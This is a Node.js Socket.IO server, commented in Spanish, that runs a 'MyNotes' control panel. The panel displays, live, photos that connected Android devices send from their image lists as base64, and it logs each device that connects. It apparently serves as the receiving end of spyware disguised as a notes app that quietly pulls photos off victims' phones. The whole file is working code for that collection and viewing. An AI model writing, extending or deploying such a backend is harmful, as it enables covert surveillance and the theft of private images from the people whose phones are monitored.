const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// Servir una página simple para ver las fotos
app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>Panel de Control - MyNotes</title>
            <style>
                body { font-family: sans-serif; background: #222; color: #fff; padding: 20px; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
                .card { background: #333; padding: 10px; border-radius: 8px; text-align: center; }
                img { width: 100%; border-radius: 5px; }
                p { font-size: 12px; overflow: hidden; text-overflow: ellipsis; }
                h1 { color: #4CAF50; }
            </style>
        </head>
        <body>
            <h1>📷 Fotos Recibidas (En Vivo)</h1>
            <div id="status">Esperando conexión...</div>
            <div class="grid" id="photoGrid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('photoGrid');
                const status = document.getElementById('status');

                socket.on('connection_alert', (msg) => {
                    status.innerText = "✅ " + msg;
                    status.style.color = '#4CAF50';
                });

                // Escuchar cuando llega una foto nueva desde el servidor (rebotada del Android)
                socket.on('new_photo', (data) => {
                    const card = document.createElement('div');
                    card.className = 'card';
                    // Convertir base64 a imagen visible
                    card.innerHTML = \`<img src="data:image/jpeg;base64,\${data.image64}"/><p>\${data.name}</p>\`;
                    grid.prepend(card); // Poner la más nueva al principio
                });
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" } // Permitir conexiones desde cualquier lugar (App Android)
});

io.on('connection', (socket) => {
    console.log('🔗 Dispositivo conectado:', socket.id);
    
    // Avisar al panel web que alguien se conectó
    io.emit('connection_alert', `Dispositivo conectado: ${socket.id}`);

    // Escuchar datos de la app Android
    socket.on('usrData', (data) => {
        if (data.dataType === 'images_list' && data.image64) {
            console.log(`📸 Recibida: ${data.name}`);
            
            // Reenviar la foto a tu navegador web para que la veas
            io.emit('new_photo', data);
        }
    });

    socket.on('disconnect', () => {
        console.log('❌ Dispositivo desconectado');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});